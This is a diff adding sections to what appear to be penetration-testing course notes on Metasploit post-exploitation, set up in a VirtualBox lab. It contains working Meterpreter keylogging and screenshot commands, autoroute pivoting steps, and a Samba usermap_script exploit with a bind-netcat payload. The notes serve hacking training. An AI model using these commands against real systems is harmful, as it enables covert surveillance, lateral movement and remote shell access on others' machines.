@@ -1209,3 +1209,41 @@ migrate explorer_process_id
   > set session [session id]    --> session on which handler is running
   > set exe::custom [backdoor location]       --> available in advance option : 'show advance'
   > exploit
+
+### Spying : Capturing key strikes and taking screenshots
+
+- **Key Logging** : keyscan plugin inside meterpreter
+- Log all mouse/keyboard events
+  > keyscan_start - start the keyscan plugin
+  > keyscan_dump - dump all the recorded data
+  > keyscan_stop - stop the keyscan plugin
+- can also take a screenshot of the target computer > screenshot
+
+### Pivoting
+
+- Use the hacked device as a pivot
+- Try to gain access to other devices in the network
+- for testing:
+  - Create Multiple NatNetwork in virtualbox
+  - one for hacker machine, one for target machine
+  - Connect windows virtual machine to 2 adaptors, one on each NatNetwork
+  - now windows can see both machine, target and hacker machine
+- **Pivoting using Autoroute**
+  - Set up a route between hacker and hacked device.
+  - Gives hacker access to devices on the network.
+  - Use metasploit exploits auxiliaries ...etc
+  - autoroute comes with meterpreter
+
+  ```txt
+    -----------------------------
+    1. Use it > use post/windows/manage/autoroute
+    2. Set subnet of target network. > set subnet [subnet]   (ex: 10.20.15.0)
+    3. Set session id. > set session [id]
+    4. exploit. > exploit
+    -----------------------------
+    - use exploit/multi/samba/usermap_script
+    - set RHOST target_ip
+    - show payloads
+    - set PAYLOAD cmd/unix/bind_netcat
+    - exploit
+  ```
